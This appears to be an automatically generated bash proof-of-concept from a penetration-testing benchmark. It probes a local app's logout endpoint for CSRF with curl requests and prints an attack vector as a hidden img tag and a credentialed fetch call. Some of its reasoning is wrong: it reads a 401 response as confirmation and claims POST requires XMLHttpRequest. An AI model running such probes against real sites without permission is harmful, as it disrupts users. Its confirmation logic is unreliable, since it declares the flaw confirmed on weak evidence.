#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint by confirming GET method acceptance and lack of CSRF protections
# Target: ./repo
# Created: 2025-11-10T19:43:40.267Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# CSRF Attack on Logout Endpoint - Proof of Concept (v2)
# This POC demonstrates that the logout endpoint is vulnerable to CSRF attacks
# by showing it accepts GET requests without CSRF token validation

TARGET_URL="${1:-http://localhost:5003}"

echo "[*] CSRF Logout Endpoint Vulnerability Analysis"
echo "[*] Target: $TARGET_URL"
echo ""

echo "[+] Test 1: Verify logout endpoint accepts GET requests"
echo "[*] Sending: curl -X GET $TARGET_URL/logout"
echo ""
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET "$TARGET_URL/logout")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
if [[ "$HTTP_CODE" == "401" ]]; then
  echo "[✓] Logout endpoint accepts GET requests (returns 401 when not authenticated)"
else
  echo "[!] Unexpected status code: $HTTP_CODE"
fi
echo ""

echo "[+] Test 2: Check allowed HTTP methods"
echo "[*] Sending: curl -X OPTIONS $TARGET_URL/logout -v"
echo ""
METHODS=$(curl -s -X OPTIONS "$TARGET_URL/logout" -v 2>&1 | grep -i "Allow:")
echo "[*] Server response:"
echo "$METHODS"
if echo "$METHODS" | grep -qi "GET"; then
  echo "[✓] GET method is allowed on logout endpoint"
else
  echo "[!] GET method not found in allowed methods"
fi
echo ""

echo "[+] Test 3: Verify no CSRF token requirement in login page"
echo "[*] Checking login page for CSRF tokens..."
LOGIN_PAGE=$(curl -s "$TARGET_URL/login")
if echo "$LOGIN_PAGE" | grep -qi "csrf"; then
  echo "[!] CSRF token found in login page"
else
  echo "[✓] No CSRF token found in login page"
fi
echo ""

echo "[+] Test 4: Simulate CSRF attack vector"
echo "[*] An attacker could embed this in a malicious webpage:"
echo ""
echo "    <img src='$TARGET_URL/logout' style='display:none'>"
echo ""
echo "[*] Or use JavaScript:"
echo ""
echo "    fetch('$TARGET_URL/logout', {"
echo "      method: 'GET',"
echo "      credentials: 'include'"
echo "    })"
echo ""
echo "[✓] This would trigger logout for any authenticated user visiting the page"
echo ""

echo "[+] Test 5: Verify GET method is CSRF-vulnerable"
echo "[*] The logout endpoint uses GET, which is inherently CSRF-vulnerable because:"
echo "    - GET requests can be triggered by <img>, <script>, <link> tags"
echo "    - GET requests include cookies automatically"
echo "    - No user interaction required (unlike POST which needs XMLHttpRequest)"
echo ""

echo "[+] Test 6: Confirm no SameSite cookie protection"
echo "[*] Checking for SameSite attribute on session cookies..."
COOKIE_HEADERS=$(curl -s -i "$TARGET_URL/login" 2>&1 | grep -i "Set-Cookie")
echo "[*] Set-Cookie headers found:"
echo "$COOKIE_HEADERS"
if echo "$COOKIE_HEADERS" | grep -qi "SameSite"; then
  echo "[!] SameSite attribute detected"
else
  echo "[✓] No SameSite attribute on cookies (CSRF vulnerability confirmed)"
fi
echo ""

echo "[+] Test 7: Verify POST method is not accepted for logout"
echo "[*] Sending: curl -X POST $TARGET_URL/logout"
echo ""
POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/logout" -H "Content-Type: application/json" -d '{}')
POST_CODE=$(echo "$POST_RESPONSE" | tail -n1)
echo "[*] HTTP Status Code for POST: $POST_CODE"
if [[ "$POST_CODE" == "405" ]] || [[ "$POST_CODE" == "404" ]]; then
  echo "[✓] POST method not allowed (only GET is supported)"
  echo "[!] This confirms GET is the only method, making it CSRF-vulnerable"
else
  echo "[*] Unexpected response code for POST"
fi
echo ""

echo "[+] CSRF VULNERABILITY SUMMARY"
echo "[✓] Logout endpoint accepts GET requests (CSRF-vulnerable)"
echo "[✓] No CSRF token validation required"
echo "[✓] No POST-only restriction"
echo "[✓] No SameSite cookie protection"
echo "[✓] Attack vector: <img src='$TARGET_URL/logout'>"
echo ""
echo "[✓] CSRF VULNERABILITY CONFIRMED"

exit 0